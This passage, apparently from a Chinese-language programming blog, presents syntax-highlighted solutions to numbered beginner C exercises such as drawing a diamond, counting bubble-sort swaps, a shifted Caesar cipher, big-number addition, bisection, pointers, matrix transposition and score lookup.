class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;s[j])&#123;</span><br><span class="line">                temp=s[i];s[i]=s[j];s[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[N+<span class="number">1</span>],res[N+<span class="number">1</span>],index[N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> m,i,j,k,t,product,len;</span><br><span class="line">    <span class="keyword">int</span> start;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s%d"</span>,str,&amp;m)==<span class="number">2</span>)&#123;</span><br><span class="line">            len=<span class="built_in">strlen</span>(str);</span><br><span class="line">        mySort(str);</span><br><span class="line">                                                                    <span class="comment">//puts(str);</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;index[i]=i;&#125;</span><br><span class="line">        <span class="keyword">for</span>(i=product=<span class="number">1</span>;i&lt;len+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            product*=i;</span><br><span class="line">            <span class="keyword">if</span>(product&gt;m)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;len-i;j++)&#123;</span><br><span class="line">            res[j]=str[j];</span><br><span class="line">            index[j]=<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//从后往前数第i个字母前的都是按全排列的第一个排列的顺序排列</span></span><br><span class="line">                                                <span class="comment">// printf("m=%d\tproduct=%d\ti=%d\n",m,product,i);</span></span><br><span class="line">        <span class="keyword">while</span>(j&lt;len)&#123;</span><br><span class="line">         product/=i;                            <span class="comment">//D</span></span><br><span class="line">         start=m/product;                       <span class="comment">//D</span></span><br><span class="line">         <span class="keyword">for</span>(t=<span class="number">0</span>;index[t]==<span class="number">-1</span>&amp;&amp;t&lt;len;t++);      <span class="comment">//D</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span>(k=t;start!=<span class="number">0</span>;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index[k]!=<span class="number">-1</span>)&#123;start--;&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">while</span>(index[k]==<span class="number">-1</span>)&#123;k++;&#125;               <span class="comment">//printf("%d***%d***\n",k,index[k]);   D</span></span><br><span class="line"></span><br><span class="line">         res[j]=str[k];</span><br><span class="line">         index[k]=<span class="number">-1</span>;</span><br><span class="line">         m%=product;                              <span class="comment">//  D M</span></span><br><span class="line">         i--;j++;                             <span class="comment">// printf("########################\n");</span></span><br><span class="line">        &#125;</span><br><span class="line">        res[j]=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="built_in">puts</span>(res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1053画菱形"><a href="#1053画菱形" class="headerlink" title="1053画菱形"></a>1053画菱形</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,j;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;n+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>*n<span class="number">-2</span>*i;j++)&#123;<span class="built_in">printf</span>(<span class="string">" "</span>);&#125;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>*i+<span class="number">1</span>;j++)&#123;<span class="built_in">printf</span>(<span class="string">"*"</span>);&#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span> ;i&gt;<span class="number">-1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>*n<span class="number">-2</span>*i;j++)&#123;<span class="built_in">printf</span>(<span class="string">" "</span>);&#125;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>*i+<span class="number">1</span>;j++)&#123;<span class="built_in">printf</span>(<span class="string">"*"</span>);&#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1054冒泡排序交换次数"><a href="#1054冒泡排序交换次数" class="headerlink" title="1054冒泡排序交换次数"></a>1054冒泡排序交换次数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,j,a[<span class="number">1000</span>],temp,t;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)==<span class="number">1</span>&amp;&amp;n!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,a+i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>,t=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[j]&lt;a[i])&#123;temp=a[j];a[j]=a[i];a[i]=temp;t++;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,t);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1055凯撒密码-K"><a href="#1055凯撒密码-K" class="headerlink" title="1055凯撒密码+K"></a>1055凯撒密码+K</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="keyword">long</span> k;</span><br><span class="line">   <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;a[i]!=<span class="string">'\0'</span>;i++)&#123;</span><br><span class="line">        j=(k+i+<span class="number">1</span>)%<span class="number">26</span>;</span><br><span class="line">        a[i]=(a[i]-<span class="string">'A'</span>+<span class="number">26</span>-j)%<span class="number">26</span>+<span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(a);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1056大数相加"><a href="#1056大数相加" class="headerlink" title="1056大数相加"></a>1056大数相加</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000+2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,j,k,m,len1,len2,jinwei;</span><br><span class="line">    <span class="keyword">char</span> a[N],b[N],c[N];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;n;m++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,a,b);</span><br><span class="line">        <span class="comment">//向右对齐，左边补零</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;a[j]!=<span class="string">'\0'</span>;a[j]-=<span class="string">'0'</span>,j++);</span><br><span class="line">        <span class="keyword">for</span>(len1=j+<span class="number">1</span>;j&gt;<span class="number">-1</span>;a[j+N-len1]=a[j],j--);</span><br><span class="line">        <span class="keyword">for</span>(j=N<span class="number">-1</span>-len1;j&gt;<span class="number">-1</span>;a[j]=<span class="number">0</span>,j--);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;b[k]!=<span class="string">'\0'</span>;b[k]-=<span class="string">'0'</span>,k++);</span><br><span class="line">        <span class="keyword">for</span>(len2=k+<span class="number">1</span>;k&gt;<span class="number">-1</span>;b[k+N-len2]=b[k],k--);</span><br><span class="line">        <span class="keyword">for</span>(k=N<span class="number">-1</span>-len2;k&gt;<span class="number">-1</span>;b[k]=<span class="number">0</span>,k--);</span><br><span class="line"><span class="comment">//相加</span></span><br><span class="line">        jinwei=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=N<span class="number">-2</span>;i&gt;<span class="number">-1</span>;i--)&#123;</span><br><span class="line">            c[i]=(a[i]+b[i]+jinwei)%<span class="number">10</span>;</span><br><span class="line">            jinwei=(a[i]+b[i]+jinwei)/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;c[i]==<span class="number">0</span>&amp;&amp;i&lt;N<span class="number">-1</span>;i++);</span><br><span class="line">        <span class="keyword">if</span>(i==N<span class="number">-1</span>)&#123;<span class="built_in">printf</span>(<span class="string">"0\n"</span>);<span class="keyword">continue</span>;&#125;<span class="comment">//考虑输入为(0,0)的情况</span></span><br><span class="line">        <span class="keyword">for</span>(;i&lt;N<span class="number">-1</span>;i++)&#123;<span class="built_in">printf</span>(<span class="string">"%d"</span>,c[i]);&#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1057二分法解方程浮点"><a href="#1057二分法解方程浮点" class="headerlink" title="1057二分法解方程浮点"></a>1057二分法解方程浮点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> func(x) 2*x*x*x-4*x*x+3*x-6</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,flag;</span><br><span class="line">    <span class="keyword">double</span> y,x,hi,lo;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lf"</span>,&amp;y)==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">        hi=<span class="number">10000</span>;</span><br><span class="line">        lo=<span class="number">-10000</span>;</span><br><span class="line">        <span class="keyword">if</span>(func(lo)-y&gt;<span class="number">0</span>||func(hi)-y&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"NULL\n"</span>);<span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!(<span class="built_in">fabs</span>(lo-hi)&lt;<span class="number">0.000001</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            x=(hi+lo)/<span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span>(func(x)-y&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                hi=x;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(func(x)-y&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                lo=x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.4lf\n"</span>,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1058小试指针"><a href="#1058小试指针" class="headerlink" title="1058小试指针"></a>1058小试指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10</span>]=&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *pt=arr;</span><br><span class="line">  <span class="comment">// int *a,*b,*c,*d;</span></span><br><span class="line">    <span class="comment">//a=b=c=d=arr;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n%p\n%p\n%d\n"</span>,&amp;arr[<span class="number">0</span>],&amp;pt,pt,*pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,*pt+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,pt[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,&amp;*pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,*&amp;pt);</span><br><span class="line">    <span class="comment">//printf("%d\n",*pt[3]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,*(pt+<span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,*pt++);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,*(pt++));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,(*pt)++);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,++(*pt));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1060转置矩阵"><a href="#1060转置矩阵" class="headerlink" title="1060转置矩阵"></a>1060转置矩阵</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n,i,j;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;m,&amp;n)==<span class="number">2</span>)&#123;</span><br><span class="line">        p=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*m*n);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,p+i*n+j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>,*(p+j*n+i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1061成绩查询"><a href="#1061成绩查询" class="headerlink" title="1061成绩查询"></a>1061成绩查询</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findmax</span><span class="params">(struct student *stu, <span class="keyword">int</span> *score, <span class="keyword">int</span> *index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    *score=(*stu).score;</span><br><span class="line">    *index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*score&lt;(*(stu+i)).score)</span><br><span class="line">        &#123;</span><br><span class="line">            *score=(*(stu+i)).score;</span><br><span class="line">            *index=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findmin</span><span class="params">(struct student *stu, <span class="keyword">int</span> *score, <span class="keyword">int</span> *index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    *score=(*stu).score;</span><br><span class="line">    *index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*score&gt;(*(stu+i)).score)</span><br><span class="line">        &#123;</span><br><span class="line">            *score=(*(stu+i)).score;</span><br><span class="line">            *index=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findaver</span><span class="params">(struct student *stu, <span class="keyword">int</span> *score, <span class="keyword">int</span> *index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum,i;</span><br><span class="line">    <span class="keyword">int</span> delta,delta_min;</span><br><span class="line">    <span class="keyword">for</span>(i=sum=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=(*(stu+i)).score;</span><br><span class="line">    &#125;</span><br><span class="line">    *score=(*stu).score;</span><br><span class="line">    *index=<span class="number">0</span>;</span><br><span class="line">    delta_min=<span class="built_in">fabs</span>((*stu).score*N-sum);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        delta=<span class="built_in">fabs</span>((*(stu+i)).score*N-sum);</span><br><span class="line">        <span class="keyword">if</span>(delta&lt;delta_min)</span><br><span class="line">        &#123;</span><br><span class="line">            delta_min=delta;</span><br><span class="line">            *score=(*(stu+i)).score;</span><br><span class="line">            *index=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">stu</span>=(<span class="title">struct</span> <span class="title">student</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">student</span>)*<span class="title">N</span>);</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> score,index;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;((*(stu+i)).id),&amp;((*(stu+i)).score));</span><br><span class="line">    &#125;</span><br><span class="line">    findmax(stu,&amp;score,&amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,(*(stu+index)).id,score);</span><br><span class="line">    findmin(stu,&amp;score,&amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,(*(stu+index)).id,score);</span><br><span class="line">    findaver(stu,&amp;score,&amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,(*(stu+index)).id,score);</span><br><span class="line">    <span class="built_in">free</span>(stu);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1063查找子字符串"><a href="#1063查找子字符串" class="headerlink" title="1063查找子字符串"></a>1063查找子字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span 